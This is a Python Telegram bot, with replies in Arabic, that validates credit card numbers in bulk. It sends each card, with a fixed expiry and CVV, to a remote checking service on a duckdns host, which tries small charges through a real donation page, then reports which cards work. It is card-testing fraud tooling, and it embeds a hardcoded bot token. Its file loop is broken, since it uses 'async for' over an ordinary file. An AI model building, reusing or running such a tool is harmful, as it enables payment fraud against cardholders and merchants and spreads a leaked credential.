import os
import re
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

TOKEN = '7327856614:AAG9fY6rjp_wPKTLNnQCgoZdzagla3h9-80'
API_URL = "http://gatescheck.duckdns.org:7000/check"

stop_flag = False

def check_card_api(card_number):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": f"{card_number}|09|28|092",
        "amount": 0.50
    }
    try:
        response = requests.get(API_URL, params=params)
        return response.json().get('result', 'غير معروف')
    except Exception as e:
        return f"خطأ في التحقق: {e}"

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag
    stop_flag = False
    keyboard = [[InlineKeyboardButton("🚫 إيقاف الفحص", callback_data='stop')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("بدأ فحص الملف. اضغط على الزر لإيقاف الفحص.", reply_markup=reply_markup)

    try:
        if not os.path.exists('downloads'):
            os.makedirs('downloads')
        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        async for line in open(file_path, 'r', encoding='utf-8'):
            if stop_flag:
                break
            line = line.strip()
            card_number_matches = re.findall(r'\d+', line)
            if card_number_matches:
                card_number = card_number_matches[0]
                result = check_card_api(card_number)
                if result == 'Insufficient Funds':
                    # إبلاغ المستخدم مباشرة
                    await update.message.reply_text(f"🚫 البطاقة: {line} - {result}")
                elif result == 'charge':
                    # نتيجة جيدة، إبلاغ المستخدم
                    await update.message.reply_text(f"✅ البطاقة: {line} تعتبر جيدة.")
                elif 'خطأ' in result:
                    # وضع الخطأ بجانب البطاقة
                    await update.message.reply_text(f"بطاقة: {line} - ✖️ {result}")
                else:
                    # النتائج غير المعروفة يمكن تجاهلها أو إظهارها
                    pass
            else:
                await update.message.reply_text(f"السطر: {line} - لم يتم العثور على رقم بطاقة.")
        if stop_flag:
            await update.message.reply_text("تم إيقاف الفحص.")
        else:
            await update.message.reply_text("انتهى الفحص.")
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ أثناء معالجة الملف: {e}")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag
    query = update.callback_query
    await query.answer()
    if query.data == 'stop':
        stop_flag = True
        await query.edit_message_text(text="تم إيقاف الفحص.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('مرحبًا! أرسل لي ملف نصي ليتحقق من بطاقات الائتمان أو استخدم الأمر /pp للتحقق من بطاقة فردية.\nمثال: /pp 1234567890')

async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not context.args:
            await update.message.reply_text("يرجى إرسال رقم البطاقة بعد الأمر /pp. مثال: /pp 1234567890")
            return
        card_number = context.args[0]
        result = check_card_api(card_number)
        if result == 'Insufficient Funds':
            await update.message.reply_text(f"🚫 نتيجة التحقق للبطاقة {card_number}: {result}")
        elif result == 'charge':
            await update.message.reply_text(f"✅ البطاقة {card_number} تعتبر جيدة.")
        elif 'خطأ' in result:
            await update.message.reply_text(f"✖️ خطأ: {result}")
        else:
            await update.message.reply_text(f"نتيجة غير معروفة: {result}")
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ: {e}")

def main():
    global stop_flag
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button))

    app.run_polling()

if __name__ == '__main__':
    main()
